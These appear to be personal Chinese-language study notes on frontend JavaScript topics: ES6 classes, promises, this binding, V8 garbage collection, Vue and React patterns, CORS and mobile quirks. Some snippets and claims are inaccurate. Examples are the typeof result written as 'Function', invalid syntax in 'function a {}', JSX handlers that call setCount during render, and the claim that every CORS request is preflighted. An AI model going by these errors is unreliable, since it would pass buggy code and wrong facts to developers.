  - 对于下面的代码，从形式上看，es6的class对应es5函数的prototype，es5函数的prototyp的constructor是函数本身，正好对上es6 class的constructor，constructor用于实例化类。但上述的理解并不准确，因为Point === Point.prototype.constructor，所以es6的class只是es6构造函数的另一种写法，另外从typeof Point === 'Function'也可以看出。
    ```javascript
      // es6
      class Point {
        constructor(x, y) {}
        toString() {}
      }
      // es5
      function Point (x, y) {}
      Point.prototype.toString = function() {}
    ```
  - 和上面实现的es5继承不同，es5的实现中，B.__proto__其实Function.prototype，但es6不同，如下，其实es6相对来说更符合语义，子类的继承来源（即__proto__）本身就是父类
    ```javascript
      class Point {}
      class B extends Point {}
      B.__proto__ === Point // true
      B.prototype.__proto__ === Point.prototype // true
    ```
  - es6 class的所有方法都是定义在prototype上的，和es5的类实现类似。es6 class定义的方法是不可枚举的，对应的es5却可以。es5的构造函数可以不用new执行，class却必须，所以pollyfill是需要判断instanceof。class不存在变量提升
  - es5不能继承原生类，比如Array、Number等，可以认为原生类内部强绑定了this，所以不能通过Parent.call(this)的方式修饰子类，经尝试通过Array.prototype.constructor.call(this)、Array.prototype.call(this)均达不到目的
  
- v8
  - nodejs中默认限制了js的内存（64位为1.4GB，32位为0.7GB）,当然也可以打开限制
  - v8在垃圾回收时，js执行会停顿，v8的优化策略大概是，将清理过程拆分为小段，没清理一次，让js运行一段时间
  - v8的垃圾回收会针对新生代对象、老生代对象采用不同的垃圾回收算法，
  - 新生代的对象为存活时间较短的对象，老生代中的对象为存活时间较长或常驻内存的对象，当一个对象经过多次新生代的清理依旧幸存，这说明它的生存周期较长，也就会被移动到老生代，会被移动到老生代
  - nodejs默认为新生代分配的内存是64MB，当频繁地产生很多小对象时，这个区域会被占满，从而出触发gc
  - https://segmentfault.com/a/1190000000440270
- Object.create就是以另一个对象为原型实例化一个对象，用于弥补非构造函数不能使用new操作符实例化继承的问题，从而可以用原型链的方式继承那个对象的方法和属性
    ```javascript
    // 创建后，b.__proto__ === a.prototype
    const b = Object.create(a.prototype)
    // 相当于
    function a {}
    const b = new a()
    // 示例
    const person = {
      a () {}
    }
    Object.create(person).a === person.a // true
    // Object.create的第二个参数，则是要添加到新创建对象的可枚举属性（即其自身定义的属性，而不是其原型链上的枚举属性）对象的属性描述符以及相应的属性名称
    ```
- promise
  - 缺点：无法取消，无法知道内部执行到了哪一阶段
  - resolve可以接受另一个promise为参数，这时当前promise会等resolve的promiseresolve后再resolve
  - resolve之后抛出的error，不会被抛出，也就是静默错误
  - Promise 对象的错误具有“冒泡”性质，会一直向后传递，直到被捕获为止。也就是说，错误总是会被下一个catch语句捕获。
  - unhandledRejection不会导致进程退出，promise中的setTimeout抛出的错误则会，因为Promise 指定在下一轮“事件循环”再抛出错误。到了那个时候，Promise 的运行已经结束了，所以这个错误是在 Promise 函数体外抛出的，会冒泡到最外层，成了未捕获的错误
  - promise finally实现：
    ```javascript
      Promise.prototype.finally = function (callback) {
      let P = this.constructor;
      return this.then(
        value  => P.resolve(callback()).then(() => value),
        reason => P.resolve(callback()).then(() => { throw reason })
      );
    };
    ```
- es6的var命令和function命令声明的全局变量，依旧是顶层对象的属性；另一方面规定，let命令、const命令、class命令声明的全局变量，不属于顶层对象的属性
- this
  - 全局环境中的this，浏览器是window，nodejs是当前模块的exports
  - 非全局环境（即函数内部），函数有被执行上下文时（作为对象的方法被调用），this指向该对象，否则（即直接被调用）：
    - 非严格模式下的this：浏览器是window，nodejs是global
    - 严格模式下都是undefined
    ```
    - es6模块中，全局或者没有被执行上下文的函数中的this都是undefined
    // 函数不管在全局被直接调用，还是在某个作用域内被调用，
    // this在非严格模式下都是都是window或global
    const a = {
      b () {
        function c () {
          console.log(this)
        }
        c()
      }
    }
    a.b() // window 或 global
    ```
  - 对于在对象原型链上某处定义的方法，同样的概念也适用。如果该方法存在于一个对象的原型链上，那么this指向的是调用这个方法的对象，就像该方法在对象上一样。
  - 当一个函数用作构造函数时（使用new关键字），它的this被绑定到正在构造的新对象。
  - 当函数被用作事件处理函数时，它的this指向触发事件的元素（一些浏览器在使用非addEventListener的函数动态添加监听函数时不遵守这个约定）。
- arguments转数组的方法：Array原型上的splice、slice等方法、...arguments，Array.from
- 扩展运算符背后调用的是遍历器接口（Symbol.iterator），如果一个对象没有部署这个接口，就无法转换。Array.from方法还支持类似数组的对象。所谓类似数组的对象，本质特征只有一点，即必须有length属性。因此，任何有length属性的对象，都可以通过Array.from方法转为数组，而此时扩展运算符就无法转换
  ```javascript
  Array.from({ length: 3 });
  // [ undefined, undefined, undefined ]
  ```
- 对象键值获取方式：for in，Object.keys、Object.getOwnPropertyNames、Object.getOwnPropertySymbols、Reflect.ownKeys，他们都遵循下面的遍历顺序：
  1. 首先遍历所有数值键，按照数值升序排列。
  2. 其次遍历所有字符串键，按照加入时间升序排列。
  3. 最后遍历所有 Symbol 键，按照加入时间升序排列。
- Object.is()用于比较值是否严格相等，解决了===判断NaN为不相等，-0 +0判断为相等的问题
- 向 Set 加入值的时候，不会发生类型转换，所以5和"5"是两个不同的值。Set 内部判断两个值是否不同，使用的算法叫做“Same-value-zero equality”，它类似于精确相等运算符（===），主要的区别是NaN等于自身，而精确相等运算符认为NaN不等于自身。
- defer与async的区别是：defer要等到整个页面在内存中正常渲染结束（DOM 结构完全生成，以及其他脚本执行完成），才会执行；async一旦下载完，渲染引擎就会中断渲染，执行这个脚本以后，再继续渲染。一句话，defer是“渲染完再执行”，async是“下载完就执行”。另外，如果有多个defer脚本，会按照它们在页面出现的顺序加载，而多个async脚本是不能保证加载顺序的。
- mvvm：Model-ViewModel-View，View 和 Model 之间并没有直接的联系，而是通过ViewModel进行交互
- vue声明周期：
  - beforeCreate：实例初始后，初始化事件和lifecycle后，数据观测 (data observer) 和 event/watcher 事件配置之前被调用
  - created：实例化完成，data、computed、watch等被实现，$el属性还不可见
  - beforeMount：在挂载开始之前被调用，相关的 render 函数首次被调用
  - mounted：el 被新创建的 vm.$el 替换，并挂载到实例上去之后调用该钩子。注意 mounted 不会承诺所有的子组件也都一起被挂载。如果你希望等到整个视图都渲染完毕，可以用 vm.$nextTick 替换掉 mounted
  - beforeUpdate：数据更新时调用，发生在虚拟 DOM 打补丁之前
  - updated：当这个钩子被调用时，组件 DOM 已经更新，所以你现在可以执行依赖于 DOM 的操作。同样的这个钩子不承诺子组件也被更新完毕，需要使用vm.$nextTick
  - activated：keep-alive 组件激活时调用
  - deactivated：keep-alive 组件停用时调用
  - beforeDestroy、destroyed、errorCaptured
- vue react对比
  - 性能：差不多，vue的初始化性能要低些，但更新性能更好，特别是react需要指定shouldComponentUpdate
  - jsx 和 template：jsx可以完整的使用js的逻辑控制，tpl上手成本低些，当然vue也支持jsx和render函数
  - css：css in js？见仁见智
  - vue稍微提供了一些好用的工具，比如v-model，
  - 社区：react丰富但没有官方的引导，造成混乱，百花齐放
  - react是很多新思想的起源地
- $route和$router的区别：$route是“路由信息对象”，包括path，params，hash，query，fullPath，matched，name等路由信息参数。而$router是“路由实例”对象包括了路由的跳转方法，钩子函数等
- vue和react的虚拟dom的diff算法类似：
  - 其实diff算法大多数时候都不是最优的，如果人为介入肯定能做得巧，但是不可能每次对比都人为介入，diff算法做到了普适性，保证不太差
  - 只会对比同级的vdom，如果是同类型标签继续对比，否则直接替换
  - vnode的到真实dom的映射是通过vnode.el指向真实dom的引用实现的
- 移动端300ms原因：浏览器需要判断用户是否是双击，双击需要缩放页面，或执行其他默认行为。 解决：
  - 使用meta标签禁止缩放，但是通常情况下，我们还是希望页面能通过双指缩放来进行缩放操作，比如放大一张图片，放大一段很小的文字
  - 设置<meta name="viewport" content="width=device-width">，浏览器就知道页面做了移动端适配，就不需要延迟了，并保留了其他元素的缩放功能
  - 上述两种方式对Safari和IE不好，Safari还有双击滚动，不能也一起禁用
  - fastclick原理：检测到touchend事件的时候，会通过DOM自定义事件立即出发模拟一个click事件，并把浏览器在300ms之后的click事件阻止掉
- 点击穿透：移动端浏览器，事件执行的顺序是touchstart > touchend > click，如果执行touchstart时隐藏了元素，由于click事件有300ms延时，click事件会派发到该元素背后的元素上，解决：
  - 延迟300ms隐藏元素
  - 禁止后面元素的click等
- 事件委托：
  - 优点：减少内存消耗，对未来新家的元素同样有效
  - 缺点：需要遍历，focus、blur不支持冒泡（focusin、focusout支持）。mousemove、mouseout 这样的事件，虽然有事件冒泡，但是只能不断通过位置去计算定位，对性能消耗高
- 负载均衡：
  - 2层负载均衡：二层负载均衡会通过一个虚拟MAC地址接收请求，然后再分配到真实的MAC地址
  - 3层负载均衡：三层负载均衡会通过一个虚拟IP地址接收请求，然后再分配到真实的IP地址；四层通过虚拟IP+端口接收请求，然后再分配到真实的服务器
  - 4层负载均衡：通过发布三层的IP地址（VIP），然后加四层的端口号，来决定哪些流量需要做负载均衡，对需要处理的流量进行NAT处理，转发至后台服务器，并记录下这个TCP或者UDP的流量是由哪台服务器处理的，后续这个连接的所有流量都同样转发到同一台服务器处理
  - 7层负载均衡：在四层的基础上（IP加端口），再考虑应用层的特征，比如七层的URL、浏览器类别、语言来决定是否要进行负载均衡、Nginx、LVS及HAProxy等就属于这一层
- 浏览器自定义事件：createEvent
- AMD、CMD：
  ```javascript
  //AMD 依赖前置
  define(['./a','./b'], function (a, b) {
      //依赖一开始就写好
      a.test();
      b.test();
  });
  //CMD 就近依赖
  define(function (requie, exports, module) {
      //依赖可以就近书写
      var a = require('./a');
      a.test();
      //软依赖
      if (status) {
          var b = requie('./b');
          b.test();
      }
  });
  ```
- css link @import的区别：
  - link引用CSS时，在页面载入时同时加载；@import需要页面网页完全载入以后加载。
  - link引用CSS时，在页面载入时同时加载；@import需要页面网页完全载入以后加载。
  - link支持使用Javascript控制DOM去改变样式；而@import其实属于css不属于文档，js不能控制
- 移动端1px边框的问题，原因：因为css中的1px并不等于移动设备的1px，这些由于不同的手机有不同的像素密度。在window对象中有一个devicePixelRatio属性，他可以反应css中的像素与设备的像素比。解决：
  - 使用box-shadow模拟边框
  - 伪类 + transform
  - https://juejin.im/post/5a800ca95188257a604991e4
- 使用float脱离文档流时，其他盒子会无视这个元素，但其他盒子内的文本依然会为这个元素让出位置，环绕在周围。 而对于使用absolute :position脱离文档流的元素，其他盒子与其他盒子内的文本都会无视它
- 中介者模式：中介者模式（Mediator Pattern）是用来降低多个对象和类之间的通信复杂性。这种模式提供了一个中介类，该类通常处理不同类之间的通信，并支持松耦合，使代码易于维护。中介者模式属于行为型模式。
- 观察者模式：当对象间存在一对多关系时，则使用观察者模式（Observer Pattern）。比如，当一个对象被修改时，则会自动通知它的依赖对象。观察者模式属于行为型模式。发布者直接通知订阅者
- 发布订阅模式：在观察者的基础上，有一个中间的event channel，发布者和订阅者互相不知道对方的存在。
- 如何判断链表是否有环：
  - 定义两个指针，同时从链表的头节点出发，一个指针一次走一步，另一个指针一次走两步。如果走得快的指针追上了走得慢的指针，那么链表就是环形链表；如果走得快的指针走到了链表的末尾（next指向 NULL）都没有追上第一个指针，那么链表就不是环形链表。
  - https://blog.csdn.net/cyuyanenen/article/details/51712420
  - https://blog.csdn.net/dawn_after_dark/article/details/73742239
- 暂时性死区：ES6 明确规定，如果区块中存在let和const命令，这个区块对这些命令声明的变量，从一开始就形成了封闭作用域。凡是在声明之前就使用这些变量，就会报错。总之，在代码块内，使用let命令声明变量之前，该变量都是不可用的。这在语法上，称为“暂时性死区”
  ```javascript
  var tmp = 123;
  if (true) {
    tmp = 'abc'; // ReferenceError
    let tmp;
  }
  ```
- cors:
  - 简单请求：是get、head、post，且头信息只能是这些组成Accept、Accept-Language、Content-Language、Last-Event-ID、Content-Type：只限于三个值application/x-www-form-urlencoded、multipart/form-data、text/plain
  - 简单请求直接发出请求，并添加origin 头
  - 非简单请求：先发一个预请求（OPTIONS）,得到服务器确认后，再发出真正的请求，一旦服务器通过了"预检"请求，以后每次浏览器正常的CORS请求，就都跟简单请求一样（经验证，这里是错的，每次请求都会进行OPTIONS确认）
- 堆和栈
  - 在c、c++中栈是编译器自动分配和释放的内存，堆是码农自己申请，并且自己需要管理的内存，自由度大
  - js中，变量大小已知（基本类型），就分配到栈里，如果未知（引用类型）就分配到堆里
  - 当一个方法执行时，每个方法都会建立自己的内存栈，在这个方法内定义的变量将会逐个放入这块栈内存里，随着方法的执行结束，这个方法的内存栈也将自然销毁了
  - 当我们在程序中创建一个对象时，这个对象将被保存到运行时数据区中，以便反复利用（因为对象的创建成本通常较大），这个运行时数据区就是堆内存。堆内存中的对象不会随方法的结束而销毁，即使方法结束后，这个对象还可能被另一个引用变量所引用（方法的参数传递时很常见），则这个对象依然不会被销毁，只有当一个对象没有任何引用变量引用它时，系统的垃圾回收机制才会在核实的时候回收它。
  - js采用词法作用域（静态作用域），即函数的作用域在函数定义的时候就决定了，比如
    ```javascript
    var value = 1;
    function foo() {
        console.log(value);
    }
    function bar() {
        var value = 2;
        foo(); // 1
    }

    ```
  - 内存泄露：闭包、绑定过多事件，比如dom事件，或者node的socket事件
  - react
    - hooks：增加了代码自由度，不再限制为写class。更容易使组件的状态和ui分离，比如一个hook返回的数据，可以用于多个ui渲染
      ```jsx
        import { useState } from 'react'
        function useCounter () {
          const [count, setCount] = useState(0)
          // 可以添加其他控制逻辑
          return [count, setCount]
        }
        function ui1 () {
          const [count, setCount] = useCounter()
          return (
            <div onclick={setCount(count + 1)}>{count}</div>
          )
        }
        function ui2 () {
          const [count, setCount] = useCounter()
          return (
            <h2 onclick={setCount(count + 1)}>{count}</h2>
          )
        }
      ```
    - 高阶组件（HOC）：接受一个组件作为参数，返回一个新的组件。可以嵌套，但是多层嵌套时，不知道是哪层的props传递到了下层，而且会有props命名覆盖的问题
      ```jsx
        const HOCFactory = (Component) => {
          return class HOC extends React.Component {
            render(){
              return <Component {...this.props} />
            }
          }
        }
      ```
    - renderProps：组件有一个render属性，render是一个函数，函数的参数是组件的state，组件会用函数的返回值进行渲染
      ```jsx
        class Mouse extends React.Component {
          constructor () {
            this.state = { x: 0, y: 0 }
          }
          render() {
            return (
              <div>
                {this.props.render(this.state)}
              </div>
            )
          }
      }
      const App = () => (
        <div>
          <Mouse render={({ x, y }) => (
            <h1>The mouse position is ({x}, {y})</h1>
          )}/>
        </div>
      )
      ```
- vue的hooks实现：
  - useState：
    ```javascript
      function useState(initial) {
        const state = vm.$data._state
        const updater = newValue => {
          state[id] = newValue
        }
        vm.$set(state, id, initial)
        return [state[id], updater]
      }
    ```
  - useEffect：
    ```javascript
      function useEffect (effect) {
        vm.$on('hook:updated', effect)
      }
    ```
  - useComputed
    ```javascript
      function useComputed (computedFunc) {
        const store = currentInstance._computedStore
        store[id] = computedFunc()
        currentInstance.$watch(computedFunc, val => {
          store[id] = val
        }, { sync: true })
      }
    ```
- vue mvvm实现思路：
  1. 递归defineProperty